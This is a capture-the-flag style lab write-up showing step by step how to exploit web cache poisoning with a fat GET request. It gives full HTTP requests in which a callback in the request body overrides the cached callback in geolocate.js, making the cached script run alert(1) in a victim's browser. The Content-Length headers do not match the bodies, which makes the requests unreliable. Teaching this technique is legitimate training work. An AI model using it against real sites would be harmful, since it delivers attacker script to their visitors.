## Web cache poisoning via a fat GET request

This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

## Notes

- Every page imports `/js/geolocate.js`
- Default callback is `setCountryCookie`
- X-Cache Header
- X-Cache-Key derived only from request line
- Parameter override via request body
- `X-Cache-Key : /js/geolocate.js?callback=setCountryCookie`

## Resume

1. Identify script import behavior  
2. Observe cache key dependency  
3. Detect body parameter override behavior  
4. Inject malicious callback  
5. Poison cache  
6. Trigger victim execution  

## Solve

We first observe that every page imports the script `/js/geolocate.js`, which executes a callback function by default:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a99004703abf85f84b53c29002f00e0.web-security-academy.net
```

We confirm that the response is dynamically generated based on the callback parameter.

Next, we test cache behavior and observe that the cache key is derived only from the request line parameter:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a99004703abf85f84b53c29002f00e0.web-security-academy.net
```

```http
HTTP/2 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
```

This confirms that only the `callback` in the URL is used for cache keying.

However, we also observe inconsistent parameter parsing: if we send a second `callback` parameter in the request body, it is processed by the backend and overrides the function used in the response, while the cache key remains unchanged.

We confirm this behavior:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a99004703abf85f84b53c29002f00e0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

callback=arbitraryFunction
```

We observe that:
- cache key still uses `setCountryCookie`
- response body uses `arbitraryFunction`

This confirms parameter override between URL and body parsing.

Now we inject the payload:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a99004703abf85f84b53c29002f00e0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

callback=alert(1)
```

We replay the request until:
- `X-Cache: hit`
- response is cached with malicious callback

Finally, we remove any cache-busting behavior and re-send the poisoned request.

The lab is solved when the victim loads any page containing `/js/geolocate.js` and the cached response executes `alert(1)`.